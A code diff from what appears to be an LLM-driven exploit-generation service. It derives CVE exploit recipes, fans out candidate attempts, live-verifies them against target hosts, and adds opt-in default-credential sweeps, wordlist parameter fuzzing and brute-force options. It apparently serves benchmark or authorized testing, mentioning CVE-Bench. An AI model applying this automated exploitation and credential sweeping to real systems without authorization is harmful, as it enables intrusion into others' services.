+    with concurrent.futures.ThreadPoolExecutor(max_workers=fanout) as _exe:
+        futures = []
+        for _k in range(fanout):
+            futures.append(_exe.submit(
+                _llm_extract_exploit_recipe,
+                cve, product, version, intel, patches,
+                model=model, prior_hints=prior_hints,
+                last_failure=prior_last_failure,
+                intel_summary=intel_summary,
+                preflight=preflight, tried_triples=tried_triples,
+                last_classifier=last_classifier,
+            ))
+        for fut in futures:
+            try:
+                r = fut.result(timeout=180) or {}
+            except Exception as e:  # noqa: BLE001
+                logging.debug("extractor candidate failed: %s", e)
+                r = {}
+            if r.get("endpoint") and r.get("injection_param"):
+                # Skip near-duplicate triples WITHIN the fan-out batch
+                tri = _recipe_triple(r)
+                if any(_recipe_triple(c) == tri for c in candidates):
+                    continue
+                candidates.append(r)
+    if not candidates:
         return {"verified": False, "source": "extract",
                 "spec": None, "evidence": "recipe extraction returned no concrete recipe",
                 "intel_summary": intel_summary or None}
+    # The first candidate becomes the primary recipe; the rest are kept
+    # for the verification cascade below. If downstream verify-first
+    # structure wants a single recipe object, use candidates[0].
+    recipe = candidates[0]
+    # Carry other candidates for a hook the verify stage can use.
+    recipe["_alt_candidates"] = candidates[1:] if len(candidates) > 1 else []
     # HTTP method hint from advisory text — tag onto the recipe so
     # _recipe_to_spec can override the LLM's method when it disagrees with
     # what the advisory literally says. Research finding on CVE-2024-3408:
@@ -18927,10 +19641,75 @@ def _derive_cve_spec_single_pass(cve, product, version, ip, port, model=None,
                             "LLM did not diversify; skipping verify to save iteration"}
     # 4. Live verify
     verdict = _live_verify_recipe(ip, port, spec)
+    # Deep-test: classify the captured curl output so the next pass
+    # extractor sees a specific near-miss pattern + hint. Classifier
+    # pulls the full raw output (headers + body + stderr from Fix #1)
+    # out of the verdict's evidence/output trail.
+    try:
+        _raw = (verdict.get("evidence") or "") + "\n" + (verdict.get("output") or "")
+        verdict["classifier"] = _classify_poc_output(_raw)
+    except Exception:  # noqa: BLE001 — classifier never raises upstream
+        pass
     if verdict["verified"]:
         _store_derived_spec(cve, product, version, spec, verdict, source="intel")
         return {"verified": True, "source": "intel", "spec": spec,
                 "evidence": verdict.get("evidence")}
+    # Deep-test: if the primary candidate failed AND we have alternates
+    # from the fan-out, verify them in turn. First that passes wins;
+    # the rest still contribute to prior_hints via tried_triples.
+    alt_candidates = recipe.get("_alt_candidates") or []
+    for alt in alt_candidates:
+        try:
+            alt_spec = _recipe_to_spec(cve, resolved_product or product, alt)
+        except Exception:  # noqa: BLE001
+            continue
+        if not alt_spec:
+            continue
+        if _is_duplicate_recipe(alt_spec, prior_hints):
+            continue
+        alt_verdict = _live_verify_recipe(ip, port, alt_spec)
+        try:
+            _raw2 = (alt_verdict.get("evidence") or "") + "\n" + (alt_verdict.get("output") or "")
+            alt_verdict["classifier"] = _classify_poc_output(_raw2)
+        except Exception:  # noqa: BLE001
+            pass
+        if alt_verdict.get("verified"):
+            _store_derived_spec(cve, product, version, alt_spec, alt_verdict,
+                                source="intel+fanout_alt")
+            return {"verified": True, "source": "intel+fanout_alt",
+                    "spec": alt_spec, "evidence": alt_verdict.get("evidence")}
+        # Still-failed alt: fold its triple into the hints row via a
+        # tentative store so the next pass's TRIPLE-BAN includes it.
+        _store_tentative_spec(cve, product, version, alt_spec, alt_verdict,
+                              source="intel+fanout_alt_failed")
+
+    # 4b. Wordlist param fuzz (deep-test, flag-gated). When every
+    # candidate hit 200 OK without the canary echoing, broaden the
+    # param-name search beyond the primary recipe's hand-picked list.
+    _cls = verdict.get("classifier") or {}
+    if _cls.get("label") == "canary_absent_200":
+        wf = _wordlist_param_fuzz_if_enabled(ip, port, spec, _cls)
+        if wf.get("ok") and wf.get("hits"):
+            # Promote the best param hit into a fresh recipe + verify
+            best = wf["hits"][0]
+            boosted = dict(recipe)
+            boosted["injection_param"] = best["param"]
+            try:
+                boost_spec = _recipe_to_spec(cve, resolved_product or product, boosted)
+                boost_verdict = _live_verify_recipe(ip, port, boost_spec)
+                try:
+                    _rawb = (boost_verdict.get("evidence") or "") + "\n" + (boost_verdict.get("output") or "")
+                    boost_verdict["classifier"] = _classify_poc_output(_rawb)
+                except Exception:
+                    pass
+                if boost_verdict.get("verified"):
+                    _store_derived_spec(cve, product, version, boost_spec,
+                                        boost_verdict, source="intel+wordlist_fuzz")
+                    return {"verified": True, "source": "intel+wordlist_fuzz",
+                            "spec": boost_spec,
+                            "evidence": boost_verdict.get("evidence")}
+            except Exception as e:  # noqa: BLE001
+                logging.debug("wordlist-fuzz promoted recipe failed: %s", e)
     # 4a. CVE-BENCH ORACLE FALLBACK (fix B): even if the spec's own proof model
     # didn't verify, the exploit may STILL have fired a goal in the CVE-Bench
     # evaluator (file read happened but canary mechanics missed; priv-esc
@@ -20259,6 +21038,38 @@ class BuildPocBody(BaseModel):
     password: Optional[str] = None
     login_url: Optional[str] = None
     bruteforce: bool = False
+
+    # ─── Deep-test knobs (all opt-in, off by default) ─────────────────
+    # Added alongside the always-on improvements (output classifier,
+    # pre-flight target recon, candidate-recipe fan-out, triple
+    # diversity constraint). These three are flagged OFF because each
+    # one has a measurable cost (minutes of extra probing or N× more
+    # LLM calls) and should only run when the operator opts in.
+
+    # Try product-aware default credentials against every login
+    # endpoint discovered during recon, mint a session from the first
+    # pair that works, and seed the exploit chain with that cookie
+    # BEFORE the model's auth_setup fires. Reads knowledge/
+    # default_credentials.yaml. Cost: ~30s per login endpoint tested.
+    enable_default_cred_sweep: bool = False
+
+    # When the output classifier flags "endpoint right, param wrong",
+    # do a two-phase SecLists burp-common param sweep (HEAD-probe
+    # triage then full POC) instead of the hand-picked ~20-name list.
+    # Cost: 30-120s depending on target responsiveness.
+    enable_wordlist_fuzz: bool = False
+
+    # Seed the derivation loop with the best exploit_store match (by
+    # cve → product → vuln_class) and verify it first. If it passes,
+    # skip derivation entirely. If it fails, its evidence still lands
+    # in prior_hints as a negative example. Zero cost when no match.
+    enable_known_poc_seed: bool = False
+
+    # How many candidate recipes to generate per iteration. The
+    # always-on fan-out defaults to 3; set 1 to disable (one recipe
+    # per iteration, prior behavior) or higher for broader exploration.
+    # Each extra candidate is one extra LLM call per iteration.
+    candidate_fanout: int = 3
 
 
 class FetchPreconditionsBody(BaseModel):
@@ -22625,6 +23436,14 @@ def build_poc_endpoint(body: BuildPocBody, authorized: bool = Depends(auth)):
     if body.username or body.password or body.bruteforce:
         auth = {"username": body.username, "password": body.password,
                 "login_url": body.login_url, "bruteforce": body.bruteforce}
+    # Deep-test knobs — propagate into contextvars so derivation helpers
+    # pick them up without passing extra params through 10+ layers.
+    _build_poc_candidate_fanout.set(max(1, int(body.candidate_fanout or 3)))
+    _build_poc_deep_flags.set({
+        "default_cred_sweep": bool(body.enable_default_cred_sweep),
+        "wordlist_fuzz": bool(body.enable_wordlist_fuzz),
+        "known_poc_seed": bool(body.enable_known_poc_seed),
+    })
     core = _build_poc_core(cve, ip, port, body.product, body.version, eid,
                            body.max_iters, model=body.model, auth=auth, recon_first=body.recon_first,
                            recon_source=body.recon_source or "basic", hint=hint,
